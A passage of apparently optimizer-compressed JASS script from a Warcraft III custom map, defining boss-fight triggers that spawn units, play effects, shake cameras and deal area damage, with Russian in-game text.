call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(8.)
if Bp5() then
set YV[71]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$68303037,Player(10),YV[71],bj_UNIT_FACING)
set Wi[11]=GetLastCreatedUnit()
call nh(Wi[11],"|c00ff00ffЯ здесь",.025,255,255,255)
call TriggerSleepAction(3.)
set SR=GetUnitsOfTypeIdAll($68303037)
call ForGroupBJ(SR,function Bp4)
call DestroyGroup(SR)
call RemoveLocation(YV[71])
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bp7 takes nothing returns nothing
set eb=CreateTrigger()
call DisableTrigger(eb)
call TriggerRegisterUnitEvent(eb,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(eb,function Bp6)
endfunction
function Bp8 takes nothing returns boolean
if not (GetUnitLifePercent(LH)<=75.) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41303647)==1) then
return false
endif
return true
endfunction
function Bp9 takes nothing returns nothing
if Bp8() then
call DisableTrigger(GetTriggeringTrigger())
set YV[73]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$6E303233,Player(10),YV[73],bj_UNIT_FACING)
call RemoveLocation(YV[73])
else
endif
endfunction
function BqB takes nothing returns nothing
set gN=CreateTrigger()
call DisableTrigger(gN)
call TriggerRegisterUnitEvent(gN,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gN,function Bp9)
endfunction
function BqC takes nothing returns boolean
if not (GetUnitLifePercent(LH)<=60.) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41303647)==1) then
return false
endif
return true
endfunction
function BqD takes nothing returns nothing
if BqC() then
call DisableTrigger(GetTriggeringTrigger())
set YV[73]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$6E303233,Player(10),YV[73],bj_UNIT_FACING)
call RemoveLocation(YV[73])
else
endif
endfunction
function BqE takes nothing returns nothing
set gO=CreateTrigger()
call DisableTrigger(gO)
call TriggerRegisterUnitEvent(gO,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gO,function BqD)
endfunction
function BqF takes nothing returns boolean
if not (GetUnitLifePercent(LH)<=25.) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41303647)==1) then
return false
endif
return true
endfunction
function BqG takes nothing returns nothing
if BqF() then
call DisableTrigger(GetTriggeringTrigger())
set YV[73]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$6E303236,Player(10),YV[73],bj_UNIT_FACING)
call RemoveLocation(YV[73])
else
endif
endfunction
function BqH takes nothing returns nothing
set gP=CreateTrigger()
call DisableTrigger(gP)
call TriggerRegisterUnitEvent(gP,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gP,function BqG)
endfunction
function BqI takes nothing returns boolean
if not (GetUnitLifePercent(LH)<=45.) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41303647)==1) then
return false
endif
return true
endfunction
function BqJ takes nothing returns nothing
if BqI() then
call DisableTrigger(GetTriggeringTrigger())
set YV[73]=GetRandomLocInRect(Dj)
call CreateNUnitsAtLoc(1,$6E303236,Player(10),YV[73],bj_UNIT_FACING)
call RemoveLocation(YV[73])
else
endif
endfunction
function BqK takes nothing returns nothing
set gQ=CreateTrigger()
call DisableTrigger(gQ)
call TriggerRegisterUnitEvent(gQ,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gQ,function BqJ)
endfunction
function BqL takes nothing returns nothing
local unit Hu=LoadUnitHandle(fl,GetHandleId(GetExpiredTimer()),1)
local unit Mc
if GetUnitState(Hu,UNIT_STATE_LIFE)>.405 then
set Mc=CreateUnitAtLoc(Player(10),$6E303157,Location(11500,-23400),0)
call UnitAddAbility(Mc,$41304356)
call UnitAddAbility(Mc,$4131394F)
call SetUnitAbilityLevel(Mc,$4131394F,4)
call UnitAddAbility(Mc,$41313643)
call UnitAddAbility(Mc,$41305655)
set Mc=null
set Mc=CreateUnitAtLoc(Player(10),$6E303159,Location(11500,-23400),0)
call UnitAddAbility(Mc,$41304356)
call UnitAddAbility(Mc,$4131394F)
call SetUnitAbilityLevel(Mc,$4131394F,4)
call UnitAddAbility(Mc,$41313643)
call UnitAddAbility(Mc,$41305655)
set Mc=null
set Mc=CreateUnitAtLoc(Player(10),$6E303155,Location(11500,-23400),0)
call UnitAddAbility(Mc,$41304356)
call UnitAddAbility(Mc,$4131394F)
call SetUnitAbilityLevel(Mc,$4131394F,4)
call UnitAddAbility(Mc,$41313643)
call UnitAddAbility(Mc,$41305655)
set Mc=null
call SaveInteger(fl,GetHandleId(GetExpiredTimer()),2,LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)<1 then
call KillUnit(Hu)
call RemoveUnit(Hu)
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(fl,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
else
call RemoveUnit(Hu)
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(fl,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function BqM takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetRandomLocInRect(Dj)
call SetUnitPositionLoc(Hu,Ht)
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function BqN takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(Hu)
local integer Pd=50
local location Nk
local group Mc
local boolexpr No
loop
set Nk=nU(Ht,Pd,GetUnitFacing(Hu))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\AquaSpike.mdx",Nk))
set Mc=CreateGroup()
set No=Condition(function my)
call GroupEnumUnitsInRange(Mc,GetLocationX(Nk),GetLocationY(Nk),80,No)
call DestroyBoolExpr(No)
set Pq=LH
set Nu=15000
call ForGroup(Mc,function nB)
call DestroyGroup(Mc)
set No=null
set Mc=null
call RemoveLocation(Nk)
set Nk=null
set Pd=Pd+50
exitwhen Pd>=1200
endloop
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function BqO takes nothing returns nothing
local unit Hu=LoadUnitHandle(fl,GetHandleId(GetExpiredTimer()),1)
local location Mc
local location No
local group Np
local boolexpr Nt
call SaveInteger(fl,GetHandleId(GetExpiredTimer()),2,LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(fl,GetHandleId(GetExpiredTimer()),2)>=1 then
set Mc=GetUnitLoc(Hu)
set No=nU(Mc,13,GetUnitFacing(Hu))
call SetUnitPositionLoc(Hu,No)
set Np=CreateGroup()
set Nt=Condition(function my)
call GroupEnumUnitsInRange(Np,GetLocationX(Mc),GetLocationY(Mc),45,Nt)
call DestroyBoolExpr(Nt)
set Pq=Hu
set Nu=10000
call ForGroup(Np,function nB)
call DestroyGroup(Np)
set Nt=null
set Np=null
call RemoveLocation(Mc)
set Mc=null
call RemoveLocation(No)
set No=null
else
call RemoveUnit(Hu)
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(fl,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function BqP takes nothing returns nothing
local group Mc
local boolexpr No
local location Np
local integer Nt
local unit Ny
local timer Ot
if GetUnitAbilityLevel(LH,$41303647)==2 and GetUnitLifePercent(LH)<=I2R(UP[0]) then
call SetUnitLifePercentBJ(LH,I2R(UP[0]))
set UP[0]=UP[0]-10
call DisableTrigger(GetTriggeringTrigger())
call nh(LH,"|c00ffff00Вы больше не друзья",.03,255,255,255)
call TriggerSleepAction(1)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,Dj,No)
call ForGroup(Mc,function BqM)
call DestroyBoolExpr(No)
call DestroyGroup(Mc)
set No=null
set Mc=null
set Np=GetRandomLocInRect(Dj)
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Other\\Monsoon\\MonsoonBoltTarget.mdl",Np))
call TriggerSleepAction(2)
set Nt=1
loop
set Ny=CreateUnitAtLoc(Player(10),$68303739,Np,30*Nt)
call AddSpecialEffectTarget("war3mapImported\\Firebrand Shot Blue.mdl",Ny,"chest")
call SetUnitScale(Ny,2,2,2)
set Ot=CreateTimer()
call SaveUnitHandle(fl,GetHandleId(Ot),1,Ny)
call SaveInteger(fl,GetHandleId(Ot),2,200)
call TimerStart(Ot,.07,true,function BqO)
set Ot=null
set Ny=null
set Nt=Nt+1
exitwhen Nt>12
endloop
call RemoveLocation(Np)
set Np=null
set Mc=CreateGroup()
set No=Condition(function my)
call GroupEnumUnitsInRect(Mc,Dj,No)
call ForGroup(Mc,function BqN)
call DestroyBoolExpr(No)
call DestroyGroup(Mc)
set No=null
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BqQ takes nothing returns nothing
local unit Mc
local timer No
if GetUnitAbilityLevel(LH,$41303647)==2 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(76)
call nh(LH,"|c00ff7f00Производство налажено!",.03,255,255,255)
set Mc=CreateUnitAtLoc(Player(10),$68303354,Location(11500,-23400),0)
set No=CreateTimer()
call SaveUnitHandle(fl,GetHandleId(No),1,Mc)
call SaveInteger(fl,GetHandleId(No),2,5)
call TimerStart(No,10,true,function BqL)
set No=null
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BqR takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BqP)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterUnitEvent(Hc,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(Hc,function BqQ)
set Hc=null
endfunction
function BqS takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BqT takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function BqU takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25.)
if BqT() then
call CreateTextTagUnitBJ("Этого Вы не ожидали точно!",LH,0,15.,0.,100,100,50.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call PauseUnit(GetTriggerUnit(),true)
call TriggerSleepAction(1.5)
call PauseUnit(GetTriggerUnit(),false)
set V0=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRectMatching(Di,Condition(function BqS))
set gS=GroupPickRandomUnit(SR)
call CreateNUnitsAtLoc(1,$68303346,Player(10),V0,bj_UNIT_FACING)
call SetUnitVertexColor(GetLastCreatedUnit(),0,0,0,100)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"attack",gS)
call UnitApplyTimedLifeBJ(5.,$42544C46,GetLastCreatedUnit())
call CreateTextTagUnitBJ(GetPlayerName(GetOwningPlayer(gS))+" держись!",LH,0,15.,100.,0.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set gS=null
call DestroyGroup(SR)
call RemoveLocation(V0)
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BqV takes nothing returns nothing
set gR=CreateTrigger()
call TriggerRegisterUnitEvent(gR,LH,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gR,function BqU)
endfunction
function BqW takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BqX takes nothing returns nothing
call SetUnitLifePercentBJ(GetEnumUnit(),GetUnitLifePercent(GetEnumUnit())-20.)
endfunction
function BqY takes nothing returns boolean
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BqZ takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
if BqY() then
set ST[68]=GetUnitsInRectMatching(B7,Condition(function BqW))
call ForGroupBJ(ST[68],function BqX)
call DestroyGroup(ST[68])
else
endif
set YV[87]=GetRandomLocInRect(B7)
call CreateNUnitsAtLoc(1,$68303049,Player(10),YV[87],bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(7.,$42544C46,GetLastCreatedUnit())
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bqa takes nothing returns nothing
set gT=CreateTrigger()
call TriggerRegisterUnitEvent(gT,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gT,function BqZ)
endfunction
function Bqb takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bqc takes nothing returns boolean
return GetFilterUnit()!=gV[2]
endfunction
function Bqd takes nothing returns boolean
return GetFilterUnit()!=gV[3]
endfunction
function Bqe takes nothing returns boolean
return GetBooleanAnd(Bqc(),Bqd())
endfunction
function Bqf takes nothing returns boolean
return GetBooleanAnd(Bqb(),Bqe())
endfunction
function Bqg takes nothing returns nothing
local unit Mc
local unit No
local unit Np
local unit Nt
if GetUnitLifePercent(LQ)<=I2R(UQ[0]) then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(UQ[0]))
set UQ[0]=UQ[0]-15
call SetUnitPositionLoc(GetTriggerUnit(),Location(14093.,-23219.))
call SetUnitOwner(LQ,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LQ,true)
set gV[1]=GroupPickRandomUnit(GetUnitsInRectMatching(B7,Condition(function Bqf)))
call SetUnitVertexColor(gV[1],0,0,255,255)
set gW[0]=GetRectCenter(B7)
set gW[1]=PolarProjectionBJ(gW[0],200.,GetRandomReal(1.,360.))
call SetUnitPositionLoc(JY,gW[1])
call TriggerSleepAction(3.)
set gW[4]=GetUnitLoc(gV[1])
if DistanceBetweenPoints(gW[1],gW[4])>=80. then
call KillUnit(gV[1])
endif
call SetUnitVertexColor(gV[1],255,255,255,255)
call SetUnitPositionLoc(JY,GetRectCenter(Ez))
if GetUnitAbilityLevel(GetTriggerUnit(),$41304452)>=2 then
set Mc=CreateUnit(Player(10),$6E303258,13510.,-23200.,270.)
set No=CreateUnit(Player(10),$6E30325A,14640.,-23200.,270.)
set Np=CreateUnit(Player(10),$6E303259,14640.,-24300.,270.)
set Nt=CreateUnit(Player(10),$6E303330,13500.,-24300.,270.)
if GetUnitAbilityLevel(GetTriggerUnit(),$41304452)==3 then
call UnitAddAbility(Mc,$41304638)
call UnitAddAbility(No,$41304638)
call UnitAddAbility(Np,$41304638)
call UnitAddAbility(Nt,$41304638)
call UnitAddAbility(Mc,$41313643)
call UnitAddAbility(No,$41313643)
call UnitAddAbility(Np,$41313643)
call UnitAddAbility(Nt,$41313643)
call UnitAddAbility(No,$41313644)
call UnitAddAbility(Np,$41313644)
call SetUnitAbilityLevel(Mc,$41303737,2)
call SetUnitAbilityLevel(No,$41636874,2)
call SetUnitAbilityLevel(No,$41436365,2)
call SetUnitAbilityLevel(Np,$41437266,2)
call SetUnitAbilityLevel(Nt,$41436463,2)
endif
set UQ[12]=0
else
call SetUnitOwner(LQ,Player(11),true)
call SetUnitInvulnerable(LQ,false)
endif
call RemoveLocation(gW[0])
call RemoveLocation(gW[1])
call RemoveLocation(gW[3])
call EnableTrigger(GetTriggeringTrigger())
endif
set Nt=null
set Np=null
set No=null
set Mc=null
endfunction
function Bqh takes nothing returns nothing
set gU=CreateTrigger()
call TriggerRegisterUnitEvent(gU,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gU,function Bqg)
endfunction
function Bqi takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bqj takes nothing returns boolean
if not (GetUnitFacing(GetEnumUnit())>=GetUnitFacing(Wi[212])-30.) then
return false
endif
if not (GetUnitFacing(GetEnumUnit())<=GetUnitFacing(Wi[212])+30.) then
return false
endif
return true
endfunction
function Bqk takes nothing returns nothing
if Bqj() then
call DoNothing()
else
call KillUnit(GetEnumUnit())
endif
endfunction
function Bql takes nothing returns boolean
if not (GetUnitLifePercent(LQ)<=I2R(UQ[1])) then
return false
endif
return true
endfunction
function Bqm takes nothing returns nothing
if Bql() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(UQ[1]))
set UQ[1]=UQ[1]-15
call SetUnitOwner(LQ,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LQ,true)
call SetUnitPositionLoc(GetTriggerUnit(),Location(14093.,-23219.))
call CreateTextTagUnitBJ("Смотрите, Птичка!",LQ,0,30.,100.,50.,0.,0.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set YV[212]=GetRandomLocInRect(Ch)
call CreateNUnitsAtLoc(1,$6E303442,Player(8),YV[212],GetRandomReal(31.,329.))
set Wi[212]=GetLastCreatedUnit()
call TriggerSleepAction(3.)
set ST[67]=GetUnitsInRectMatching(B7,Condition(function Bqi))
call ForGroupBJ(ST[67],function Bqk)
call DestroyGroup(ST[67])
call RemoveUnit(Wi[212])
call TriggerSleepAction(1.)
call SetUnitOwner(LQ,Player(11),true)
call SetUnitInvulnerable(LQ,false)
call RemoveLocation(YV[115])
call RemoveLocation(YV[212])
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Bqn takes nothing returns nothing
set gX=CreateTrigger()
call TriggerRegisterUnitEvent(gX,LQ,EVENT_UNIT_DAMAGED)
call TriggerAddAction(gX,function Bqm)
endfunction
function Bqo takes nothing returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(GetTriggerUnit()))
if IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO) then
if GetLocalPlayer()==Player(Ma) then
call CameraSetSourceNoise(0,0)
call CameraSetTargetNoise(0,0)
call ResetToGameCamera(0)
endif
endif
endfunction
function Bqp takes nothing returns nothing
local group V9=CreateGroup()
local boolexpr gJ=Condition(function mv)
local integer Mc
call GroupEnumUnitsInRect(V9,B7,gJ)
if CountUnitsInGroup(V9)==0 or GetUnitLifePercent(LQ)>=90 then
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
else
set Mc=0
loop
if RectContainsUnit(B7,MT[Mc]) then
call SetCameraFieldForPlayer(Player(Mc),CAMERA_FIELD_ROTATION,CameraSetupGetFieldSwap(CAMERA_FIELD_ROTATION,GetCurrentCameraSetup())+15.,2.)
endif
set Mc=Mc+1
exitwhen Mc==8
endloop
endif
call DestroyBoolExpr(gJ)
call DestroyGroup(V9)
set gJ=null
set V9=null
endfunction
function Bqq takes nothing returns nothing
local unit Hu=GetTriggerUnit()
if IsUnitType(Hu,UNIT_TYPE_HERO) and RectContainsUnit(B7,Hu) and GetUnitAbilityLevel(LQ,$41313947)>=2 then
call SetUnitLifePercentBJ(Hu,GetUnitLifePercent(Hu)-8)
endif
set Hu=null
endfunction
function Bqr takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=Location(-15500,2211)
call SetUnitPositionLoc(Hu,Ht)
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function Bqs takes nothing returns nothing
local integer Pd
local location dR
local location Ht
local group V9
local boolexpr Nb
local unit Hu
local integer L9=0
loop
set Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1+L9)
set Pd=150
loop
set Ht=GetUnitLoc(Hu)
set dR=nU(Ht,Pd,GetUnitFacing(Hu))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Singularity II Red.mdx",dR))
set V9=CreateGroup()
set Nb=Condition(function my)
call GroupEnumUnitsInRange(V9,GetLocationX(dR),GetLocationY(dR),130,Nb)
call DestroyBoolExpr(Nb)
call ForGroup(V9,function Bqr)
call DestroyGroup(V9)
set Nb=null
set V9=null
call RemoveLocation(dR)
set dR=null
set Pd=Pd+150
exitwhen Pd>=2200
endloop
call RemoveLocation(Ht)
set Ht=null
call RemoveUnit(Hu)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1+L9)
set L9=L9+1
exitwhen L9>=9
endloop
set Hu=null
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function Bqt takes nothing returns nothing
local location Mc
local location No
local location Np
local unit Nt
local unit Ny
local unit Ot
local unit Ou
local unit Ov
local unit Ow
local unit Ox
local unit Oz
local unit O0
local timer O1
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),0,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),0)>=1 then
set Mc=Location(GetRandomReal(13533,14600),-22980)
set No=Location(13390,GetRandomReal(-23100,-23600))
set Np=Location(13390,GetRandomReal(-23750,-24220))
set Nt=CreateUnitAtLoc(Player(10),$6E303646,Mc,270)
set Ny=CreateUnitAtLoc(Player(10),$6E303646,nU(Mc,150,0),270)
set Ot=CreateUnitAtLoc(Player(10),$6E303646,nU(Mc,150,180),270)
set Ou=CreateUnitAtLoc(Player(10),$6E303646,No,0)
set Ov=CreateUnitAtLoc(Player(10),$6E303646,Np,0)
set Ow=CreateUnitAtLoc(Player(10),$6E303646,nU(No,150,90),0)
set Ox=CreateUnitAtLoc(Player(10),$6E303646,nU(No,150,270),0)
set Oz=CreateUnitAtLoc(Player(10),$6E303646,nU(Np,150,90),0)
set O0=CreateUnitAtLoc(Player(10),$6E303646,nU(Np,150,270),0)
set O1=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(O1),1,Nt)
call SaveUnitHandle(Nq,GetHandleId(O1),2,Ou)
call SaveUnitHandle(Nq,GetHandleId(O1),3,Ov)
call SaveUnitHandle(Nq,GetHandleId(O1),4,Ny)
call SaveUnitHandle(Nq,GetHandleId(O1),5,Ot)
call SaveUnitHandle(Nq,GetHandleId(O1),6,Ow)
call SaveUnitHandle(Nq,GetHandleId(O1),7,Ox)
call SaveUnitHandle(Nq,GetHandleId(O1),8,Oz)
call SaveUnitHandle(Nq,GetHandleId(O1),9,O0)
call TimerStart(O1,3,false,function Bqs)
set O1=null
call RemoveLocation(Mc)
call RemoveLocation(No)
call RemoveLocation(Np)
set Mc=null
set No=null
set Np=null
set Nt=null
set Ou=null
set Ov=null
set Ny=null
set Ot=null
set Ow=null
set Ox=null
set Oz=null
set O0=null
else
call SetUnitOwner(LQ,Player(11),true)
call SetUnitInvulnerable(LQ,false)
call ShowUnit(LQ,true)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endfunction
function Bqu takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local integer L9=0
loop
if Ma!=L9 then
call SetPlayerAlliance(Player(Ma),Player(L9),ALLIANCE_SHARED_VISION,true)
endif
set L9=L9+1
exitwhen L9==8
endloop
call UnitRemoveAbility(Hu,$4130454C)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function Bqv takes nothing returns nothing
local unit Hu=GetEnumUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local integer L9=0
local timer Hc
loop
if Ma!=L9 then
call SetPlayerAlliance(Player(Ma),Player(L9),ALLIANCE_SHARED_VISION,false)
endif
set L9=L9+1
exitwhen L9==8
endloop
call UnitAddAbility(Hu,$4130454C)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,8,false,function Bqu)
set Hu=null
set Hc=null
endfunction
function Bqw takes nothing returns nothing
if GetItemTypeId(GetEnumItem())==$49313032 then
call RemoveItem(GetEnumItem())
endif
endfunction
function Bqx takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local location Mc
local real No
local real Np
local location Nt
local group Ny
local boolexpr Ot
if GetUnitAbilityLevel(Hu,$41304452)==3 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20)
if GetOwningPlayer(Hu)==Player(11) then
if GetRandomInt(1,2)==1 then
call nh(Hu,"|c000000ffВозмездие",.035,255,255,255)
call SetUnitVertexColor(Hu,0,0,255,255)
call PauseUnit(Hu,true)
set Mc=GetUnitLoc(Hu)
call TriggerSleepAction(2)
set No=150
set Np=0
loop
set Nt=nU(Mc,No,Np)
set Ny=CreateGroup()
set Ot=Condition(function my)
call GroupEnumUnitsInRange(Ny,GetLocationX(Nt),GetLocationY(Nt),300,Ot)
call DestroyBoolExpr(Ot)
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Demon\\DarkPortal\\DarkPortalTarget.mdl",Nt))
call ForGroup(Ny,function Bec)
call DestroyGroup(Ny)
set Ot=null
set Ny=null
call RemoveLocation(Nt)
set Nt=null
set Np=Np+30
exitwhen Np>=360
endloop
call RemoveLocation(Mc)
set Mc=null
call PauseUnit(Hu,false)
elseif GetRandomInt(1,1)==1 then
call SetUnitVertexColor(Hu,0,0,0,255)
call nh(Hu,"|c00000000Возмездие",.035,255,255,255)
call PauseUnit(Hu,true)
set Mc=GetUnitLoc(Hu)
call TriggerSleepAction(2.2)
set No=700
loop
set Np=0
loop
set Nt=nU(Mc,No,Np)
set Ny=CreateGroup()
set Ot=Condition(function my)
call GroupEnumUnitsInRange(Ny,GetLocationX(Nt),GetLocationY(Nt),300,Ot)
call DestroyBoolExpr(Ot)
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Demon\\DarkPortal\\DarkPortalTarget.mdl",Nt))
call ForGroup(Ny,function Bec)
call DestroyGroup(Ny)
set Ot=null
set Ny=null
call RemoveLocation(Nt)
set Nt=null
set Np=Np+20
exitwhen Np>=360
endloop
set No=No+300
exitwhen No>=1000
endloop
call RemoveLocation(Mc)
set Mc=null
call PauseUnit(Hu,false)
endif
call TriggerSleepAction(5)
call SetUnitVertexColor(Hu,255,255,255,255)
endif
call EnableTrigger(GetTriggeringTrigger())
endif
set Hu=null
endfunction
function Bqy takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local timer Mc
if GetUnitLifePercent(Hu)<=I2R(UQ[4]) and GetUnitAbilityLevel(Hu,$41304452)==3 then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(Hu,I2R(UQ[4]))
set UQ[4]=UQ[4]-20
call SetUnitOwner(Hu,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Hu,true)
call ShowUnit(Hu,false)
set Mc=CreateTimer()
call SaveInteger(Nq,GetHandleId(Mc),0,7)
call TimerStart(Mc,3.2,true,function Bqt)
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
set Hu=null
endfunction
function Bqz takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer Mc
local timer No
local group Np
local boolexpr Nt
if GetUnitLifePercent(Hu)<=I2R(UQ[3]) and GetUnitAbilityLevel(Hu,$41304452)==3 then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(Hu,I2R(UQ[3]))
if UQ[3]==90 then
set Mc=0
loop
if RectContainsUnit(B7,MT[Mc]) then
call CameraSetTargetNoiseForPlayer(Player(Mc),120.,2.5)
endif
set Mc=Mc+1
exitwhen Mc==8
endloop
elseif UQ[3]==45 then
set No=CreateTimer()
call TimerStart(No,2,true,function Bqp)
set No=null
endif
set UQ[3]=UQ[3]-15
set Mc=0
loop
call CreateItem($49313032,GetRandomReal(13350,14830),GetRandomReal(-24400,-22970))
set Mc=Mc+1
exitwhen Mc==27
endloop
set ga[111]=675000
call TriggerSleepAction(8)
call EnumItemsInRect(B7,null,function Bqw)
set Np=CreateGroup()
set Nt=Condition(function my)
call GroupEnumUnitsInRect(Np,B7,Nt)
set Pq=LQ
set Nu=ga[111]
call nh(LQ,I2S(ga[111]),.033,255,0,0)
call ForGroup(Np,function nB)
call DestroyBoolExpr(Nt)
call DestroyGroup(Np)
set Nt=null
set Np=null
call EnableTrigger(GetTriggeringTrigger())
endif
set Hu=null
endfunction
function Bq0 takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local group Mc
local boolexpr No
if GetUnitAbilityLevel(Hu,$41304452)==3 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25)
if GetOwningPlayer(Hu)==Player(11) then
call UnitRemoveAbility(Hu,$41313947)
if GetRandomInt(1,2)==1 then
call UnitAddAbility(Hu,$41313947)
call nh(Hu,"|c00000000Затмение",.033,255,255,255)
call SetUnitVertexColor(Hu,0,0,0,100)
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,B7,No)
call ForGroup(Mc,function Bqv)
call DestroyBoolExpr(No)
